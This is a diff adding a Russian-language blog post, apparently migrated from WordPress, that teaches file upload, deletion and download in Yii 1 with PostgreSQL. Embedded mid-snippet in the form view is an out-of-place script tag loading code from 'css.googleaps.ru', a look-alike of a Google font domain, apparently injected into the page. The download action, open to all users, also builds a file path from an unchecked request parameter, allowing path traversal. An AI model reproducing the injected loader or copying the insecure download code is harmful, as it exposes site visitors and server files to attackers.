@@ -1,0 +1,304 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii загрузка файлов
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1615
+wordpress_url: http://devdocs.ru/partners-news/yii-zagruzka-faylov/
+date: '2015-07-03 14:37:09 +0200'
+date_gmt: '2015-07-03 14:37:09 +0200'
+categories:
+- Yii framework
+tags:
+- php
+- docx
+- ip
+- post
+- sql
+- ui
+- des1roer
+- yii1
+- yii
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;">
+<div dir="ltr" style="text-align: left;"><a href="http:&#47;&#47;loco.ru&#47;materials&#47;127-yii-image-upload" target="_blank">по мотивам<&#47;a>создаем таблицу (я использую postgres)</p>
+<pre><code>CREATE TABLE techbase.item (<br />
+  id SERIAL,<br />
+  name TEXT NOT NULL,<br />
+  url TEXT,<br />
+  CONSTRAINT item_pkey PRIMARY KEY(id),<br />
+  CONSTRAINT item_url_key UNIQUE(url)<br />
+)<br />
+WITH (oids = false);</p>
+<p>COMMENT ON COLUMN techbase.item.id<br />
+IS 'ид';</p>
+<p>COMMENT ON COLUMN techbase.item.name<br />
+IS 'имя';</p>
+<p>COMMENT ON COLUMN techbase.item.url<br />
+IS 'Источник (URL без http:&#47;&#47;)';<&#47;code><&#47;pre><br />
+создаем модель и круд</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;1.bp.blogspot.com&#47;-K1jMyfzSB8o&#47;VZZxnTd1X9I&#47;AAAAAAAAAkU&#47;7PFp39LtxLI&#47;s1600&#47;Screenshot_10.png"><img src="http:&#47;&#47;1.bp.blogspot.com&#47;-K1jMyfzSB8o&#47;VZZxnTd1X9I&#47;AAAAAAAAAkU&#47;7PFp39LtxLI&#47;s320&#47;Screenshot_10.png" alt="" width="320" height="302" border="0" &#47;><&#47;a><&#47;div></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;2.bp.blogspot.com&#47;-q2ojlyu7m98&#47;VZZx00TiLnI&#47;AAAAAAAAAkc&#47;UyXhemmHdBc&#47;s1600&#47;Screenshot_11.png"><img src="http:&#47;&#47;2.bp.blogspot.com&#47;-q2ojlyu7m98&#47;VZZx00TiLnI&#47;AAAAAAAAAkc&#47;UyXhemmHdBc&#47;s320&#47;Screenshot_11.png" alt="" width="320" height="290" border="0" &#47;><&#47;a><&#47;div><br />
+правим protectedmodelsItem.php чтобы получилось следующее</p>
+<pre><code>class Item extends CActiveRecord<br />
+{</p>
+<p>    public $icon; &#47;&#47; атрибут для хранения загружаемой картинки статьи<br />
+    public $del_img; &#47;&#47; атрибут для удаления уже загруженной картинки</p>
+<p>    &#47;**<br />
+     * @return string the associated database table name<br />
+     *&#47;</p>
+<p>    public function tableName()<br />
+    {<br />
+        return 'item';<br />
+    }</p>
+<p>    &#47;**<br />
+     * @return array validation rules for model attributes.<br />
+     *&#47;<br />
+    public function rules()<br />
+    {<br />
+        &#47;&#47; NOTE: you should only define rules for those attributes that<br />
+        &#47;&#47; will receive user inputs.<br />
+        return array(<br />
+            array('name', 'required'),<br />
+            array('url', 'safe'),<br />
+            array('del_img', 'boolean'),<br />
+            array('icon', 'file',<br />
+                'types' => 'doc,docx,xls,xlsx,odt,pdf',<br />
+                'maxSize' => 1024 * 1024 * 5, &#47;&#47; 5 MB<br />
+                'allowEmpty' => 'true',<br />
+                'tooLarge' => 'Файл весит больше 5 MB. Пожалуйста, загрузите файл меньшего размера.',<br />
+            ),<br />
+            &#47;&#47; The following rule is used by search().<br />
+            &#47;&#47; @todo Please remove those attributes that should not be searched.<br />
+            array('id, name, url', 'safe', 'on' => 'search'),<br />
+        );<br />
+    }</p>
+<p>    public function attributeLabels()<br />
+    {<br />
+        return array(<br />
+            'id' => 'ид',<br />
+            'name' => 'имя',<br />
+            'url' => 'Источник (URL без http:&#47;&#47;)',<br />
+            'icon' => 'Картинка к статье',<br />
+            'del_img' => 'Удалить картинку?',<br />
+        );<br />
+    }<&#47;code><&#47;pre><br />
+в корне&nbsp; создаем папку files</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;1.bp.blogspot.com&#47;-LtNZ3dCl3XU&#47;VZZ1E5ZP2MI&#47;AAAAAAAAAko&#47;c47tZTvGQus&#47;s1600&#47;Screenshot_12.png"><img src="http:&#47;&#47;1.bp.blogspot.com&#47;-LtNZ3dCl3XU&#47;VZZ1E5ZP2MI&#47;AAAAAAAAAko&#47;c47tZTvGQus&#47;s320&#47;Screenshot_12.png" alt="" width="320" height="244" border="0" &#47;><&#47;a><&#47;div><br />
+viewsitem_form.php добавляем</p>
+<pre style="background: #fff; color: black;">
+<div class<span style="color: #0100b6; font-weight: bold;">=<&#47;span><span style="color: #d80800;">"row"<&#47;span>><br />
+        <<span style="color: #0100b6; font-weight: bold;">?<&#47;span>php echo $form<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>labelEx($model, <span style="color: #d80800;">'url'<&#47;span>); <span style="color: #0100b6; font-weight: bold;">?<&#47;span>><br />
+        <<span style="color: #0100b6; font-weight: bold;">?<&#47;span>php<br />
+        <span style="color: #00b418;">&#47;&#47;Если картинка для данного товара загружена, предложить её удалить, отметив чекбокс<&#47;span><br />
+        <span style="color: #0100b6; font-weight: bold;">if<&#47;span> (isset($model<span style="color: #0100b6; font-weight: bold;">-<&#47;span>><span style="color: #3c4c72; font-weight: bold;">url<&#47;span>) <span style="color: #0100b6; font-weight: bold;">&amp;<&#47;span><span style="color: #0100b6; font-weight: bold;">&amp;<&#47;span> file_exists($_SERVER[<span style="color: #d80800;">'DOCUMENT_ROOT'<&#47;span>] .<br />
+                        Yii<span style="color: #0100b6; font-weight: bold;">:<&#47;span><span style="color: #0100b6; font-weight: bold;">:<&#47;span>app()<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>urlManager<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>baseUrl .<br />
+                        <span style="color: #d80800;">'&#47;files&#47;'<&#47;span> . $model<span style="color: #0100b6; font-weight: bold;">-<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;span>><span style="color: #3c4c72; font-weight: bold;">url<&#47;span>))<br />
+        {<br />
+            echo $form<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>checkBox($model, <span style="color: #d80800;">'del_img'<&#47;span>, array(<span style="color: #d80800;">'class'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=<&#47;span>> <span style="color: #d80800;">'span-1'<&#47;span>));<br />
+            echo $form<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>labelEx($model, <span style="color: #d80800;">'del_img'<&#47;span>, array(<span style="color: #d80800;">'class'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=<&#47;span>> <span style="color: #d80800;">'span-2'<&#47;span>));<br />
+        }<br />
+        <span style="color: #0100b6; font-weight: bold;">?<&#47;span>><br />
+        <br <span style="color: #0100b6; font-weight: bold;">&#47;<&#47;span>><br />
+        <<span style="color: #0100b6; font-weight: bold;">?<&#47;span>php<br />
+        <span style="color: #00b418;">&#47;&#47;Поле загрузки файла<&#47;span><br />
+        echo CHtml<span style="color: #0100b6; font-weight: bold;">:<&#47;span><span style="color: #0100b6; font-weight: bold;">:<&#47;span>activeFileField($model, <span style="color: #d80800;">'icon'<&#47;span>);<br />
+        <span style="color: #0100b6; font-weight: bold;">?<&#47;span>><br />
+        <<span style="color: #0100b6; font-weight: bold;">?<&#47;span>php echo $form<span style="color: #0100b6; font-weight: bold;">-<&#47;span>>error($model, <span style="color: #d80800;">'url'<&#47;span>); <span style="color: #0100b6; font-weight: bold;">?<&#47;span>><br />
+    <<span style="color: #0100b6; font-weight: bold;">&#47;<&#47;span>div><&#47;pre><br />
+ну и поправим</p>
+<pre style="background: #fff; color: black;">    <?php<br />
+    <span style="color: #0206ff; font-style: italic;">$form<&#47;span> <span style="color: #0100b6; font-weight: bold;">=<&#47;span> <span style="color: #0206ff; font-style: italic;">$this<&#47;span><span style="color: #0100b6; font-weight: bold;">-><&#47;span>beginWidget(<span style="color: #d80800;">'CActiveForm'<&#47;span>, <span style="color: #3c4c72; font-weight: bold;">array<&#47;span>(<br />
+        <span style="color: #d80800;">'id'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=><&#47;span> <span style="color: #d80800;">'item-form'<&#47;span>,<br />
+        <span style="color: #00b418;">&#47;&#47; Please note: When you enable ajax validation, make sure the corresponding<&#47;span><br />
+        <span style="color: #00b418;">&#47;&#47; controller action is handling ajax validation correctly.<&#47;span><br />
+        <span style="color: #00b418;">&#47;&#47; There is a call to performAjaxValidation() commented in generated controller code.<&#47;span><br />
+        <span style="color: #00b418;">&#47;&#47; See class documentation of CActiveForm for details on this.<&#47;span><br />
+        <span style="color: #d80800;">'enableAjaxValidation'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=><&#47;span> <span style="color: #585cf6; font-style: italic;">false<&#47;span>,<br />
+        <span style="color: #d80800;">'htmlOptions'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=><&#47;span> <span style="color: #3c4c72; font-weight: bold;">array<&#47;span>(<span style="color: #d80800;">'enctype'<&#47;span> <span style="color: #0100b6; font-weight: bold;">=><&#47;span> <span style="color: #d80800;">'multipart&#47;form-data'<&#47;span>),<br />
+    ));<br />
+    ?><&#47;pre><br />
+controllersItemController.php</p>
+<pre><code>    public function actionCreate()<br />
+    {</p>
+<p>        $model = new Item;</p>
+<p>        &#47;&#47; Uncomment the following line if AJAX validation is needed<br />
+        &#47;&#47; $this->performAjaxValidation($model);</p>
+<p>        if (isset($_POST['Item']))<br />
+        {<br />
+            &#47;&#47;Полю icon присвоить значения поля формы icon<br />
+            $model->attributes = $_POST['Item'];<br />
+            $model->icon = CUploadedFile::getInstance($model, 'icon');<br />
+            if ($model->icon)<br />
+            {<br />
+                $sql = "   SELECT COALESCE(setval('techbase.item_id_seq', max(id)),nextval('techbase.item_id_seq'))  FROM techbase.item,<br />
+                    (SELECT<br />
+                    nextval('techbase.item_id_seq')) as sel";<br />
+                $connection = Yii::app()->db;<br />
+                $id = $connection->createCommand($sql)->queryScalar() + 1;</p>
+<p>                $sourcePath = pathinfo($model->icon->getName());<br />
+                $fileName = $id . '_doc.' . $sourcePath['extension'];<br />
+                $model->url = $fileName;<br />
+            }</p>
+<p>            if ($model->save())<br />
+            {<br />
+                &#47;&#47;Если поле загрузки файла не было пустым, то<br />
+                if ($model->icon)<br />
+                {<br />
+                    &#47;&#47;сохранить файл на сервере в каталог images&#47;2011 под именем<br />
+                    &#47;&#47;month-day-alias.jpg<br />
+                    $file = $_SERVER['DOCUMENT_ROOT'] .<br />
+                            Yii::app()->urlManager->baseUrl .<br />
+                            '&#47;files&#47;' . $fileName;<br />
+                    $model->icon->saveAs($file);<br />
+                }<br />
+                $this->redirect(array('view', 'id' => $id));<br />
+            }<br />
+        }</p>
+<p>        $this->render('create', array(<br />
+            'model' => $model,<br />
+        ));<br />
+    }</p>
+<p>    public function actionUpdate($id)<br />
+    {<br />
+        $model = $this->loadModel($id);</p>
+<p>        &#47;&#47; Uncomment the following line if AJAX validation is needed<br />
+        &#47;&#47; $this->performAjaxValidation($model);<br />
+        if (isset($model->url))<br />
+        {<br />
+            $docname = $model->url;<br />
+        }</p>
+<p>        if (isset($_POST['Item']))<br />
+        {<br />
+            $model->attributes = $_POST['Item'];<br />
+            $model->icon = CUploadedFile::getInstance($model, 'icon');<br />
+            if ($model->icon)<br />
+            {<br />
+                $sourcePath = pathinfo($model->icon->getName());<br />
+                $fileName = $model->id . '_doc.' . $sourcePath['extension'];<br />
+                $model->url = $fileName;<br />
+            }<br />
+            &#47;&#47;Если отмечен чекбокс &laquo;удалить файл&raquo;<br />
+            if ($model->del_img)<br />
+            {<br />
+                if (file_exists($_SERVER['DOCUMENT_ROOT'] .<br />
+                                Yii::app()->urlManager->baseUrl .<br />
+                                '&#47;files&#47;' . $model->url))<br />
+                {<br />
+                    &#47;&#47;удаляем файл<br />
+                    unlink('.&#47;files&#47;' . $model->url);<br />
+                    $model->url = NULL;<br />
+                }<br />
+            }<br />
+            if ($model->save())<br />
+            {<br />
+                &#47;&#47;Если поле загрузки файла не было пустым, то<br />
+                if ($model->icon)<br />
+                {<br />
+                    if (isset($model->url) &amp;&amp; (file_exists($_SERVER['DOCUMENT_ROOT'] .<br />
+                                    Yii::app()->urlManager->baseUrl .<br />
+                                    '&#47;files&#47;' . $model->url)))<br />
+                        unlink('.&#47;files&#47;' . $docname);<br />
+                    $file = '.&#47;files&#47;' . $fileName;<br />
+                    &#47;&#47;сохранить файл на сервере под именем<br />
+                    &#47;&#47;month-day-alias.jpg Если файл с таким именем существует, он будет заменен.<br />
+                    $model->icon->saveAs($file);<br />
+                }<br />
+                $this->redirect(array('view', 'id' => $model->id));<br />
+            }<br />
+        }</p>
+<p>        $this->render('update', array(<br />
+            'model' => $model,<br />
+        ));<br />
+    }</p>
+<p>    &#47;**<br />
+     * Deletes a particular model.<br />
+     * If deletion is successful, the browser will be redirected to the 'admin' page.<br />
+     * @param integer $id the ID of the model to be deleted<br />
+     *&#47;<br />
+    public function actionDelete($id)<br />
+    {<br />
+        $model = $this->loadModel($id);<br />
+        if (isset($model->url) &amp;&amp; (file_exists($_SERVER['DOCUMENT_ROOT'] .<br />
+                        Yii::app()->urlManager->baseUrl .<br />
+                        '&#47;files&#47;' . $model->url)))<br />
+            unlink('.&#47;files&#47;' . $model->url);<br />
+        $this->loadModel($id)->delete();</p>
+<p>        &#47;&#47; if AJAX request (triggered by deletion via admin grid view), we should not redirect the browser<br />
+        if (!isset($_GET['ajax']))<br />
+            $this->redirect(isset($_POST['returnUrl']) ? $_POST['returnUrl'] : array('admin'));<br />
+    }<&#47;code><&#47;pre><br />
+Без скачивания тутор будет не полным.<br />
+добавим в protectedcontrollersItemController.php</p>
+<pre><code>    public function actionGetFile($id)<br />
+    {</p>
+<p>        &#47;&#47; некоторая логика по обработке пути из url в путь до файла на сервере<br />
+        $currentFile = $_SERVER['DOCUMENT_ROOT'] .<br />
+                Yii::app()->urlManager->baseUrl .<br />
+                '&#47;files&#47;' . $id;</p>
+<p>        if (is_file($currentFile))<br />
+        {<br />
+            header("Content-Type: application&#47;octet-stream");<br />
+            header("Accept-Ranges: bytes");<br />
+            header("Content-Length: " . filesize($currentFile));<br />
+            header("Content-Disposition: attachment; filename=" . $id);<br />
+            readfile($currentFile);<br />
+        };<br />
+    }<&#47;code><&#47;pre><br />
+не забудьте</p>
+<pre><code>    public function accessRules()<br />
+    {<br />
+        return array(<br />
+            array('allow', &#47;&#47; allow all users to perform 'index' and 'view' actions<br />
+                'actions' => array('index', 'view', 'getfile'),<br />
+                'users' => array('*'),<br />
+            ),<&#47;code><&#47;pre><br />
+protectedviewsitemadmin.php</p>
+<pre><code>$this->widget('zii.widgets.grid.CGridView', array(<br />
+    'id' => 'item-grid',<br />
+    'dataProvider' => $model->search(),<br />
+    'filter' => $model,<br />
+    'columns' => array(<br />
+        'id',<br />
+        'name',<br />
+        &#47;&#47;'url',<br />
+        array(<br />
+            'name' => 'url',<br />
+            'type' => 'raw',<br />
+            'value' => 'CHtml::link("файл", "getfile&#47;id&#47;".$data->url)'<br />
+        ),<br />
+        array(<br />
+            'class' => 'CButtonColumn',<br />
+        ),<br />
+    ),<br />
+));<&#47;code><&#47;pre><br />
+protectedviewsitem_view.php</p>
+<pre style="background: #fff; color: black;">    <b><?php <span style="color: #a535ae;">echo<&#47;span> <span style="color: #a535ae;">CHtml<&#47;span><span style="color: #ff5600;">::<&#47;span>encode($data<span style="color: #ff5600;">-><&#47;span>getAttributeLabel(<span style="color: #00a33f;">'url'<&#47;span>)); ?>:<&#47;b><br />
+    <?php <span style="color: #a535ae;">echo<&#47;span>  <span style="color: #a535ae;">CHtml<&#47;span><span style="color: #ff5600;">::<&#47;span>link(<span style="color: #00a33f;">"файл"<&#47;span>, <span style="color: #00a33f;">"getfile&#47;id&#47;"<&#47;span><span style="color: #ff5600;">.<&#47;span>$data<span style="color: #ff5600;">-><&#47;span>url); ?><br />
+    <br &#47;><&#47;pre><br />
+protectedviewsitemview.php</p>
+<pre><code>$this->widget('zii.widgets.CDetailView', array(<br />
+    'data' => $model,<br />
+    'attributes' => array(<br />
+        'id',<br />
+        'name',<br />
+        'url' => array(<br />
+            'name' => 'url',<br />
+            'value' => CHtml::link("файл", "getfile&#47;id&#47;" . $data->url),<br />
+        ),<br />
+    ),<br />
+));<&#47;code><&#47;pre><br />
+<&#47;div><br />
+<&#47;div><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com</p>
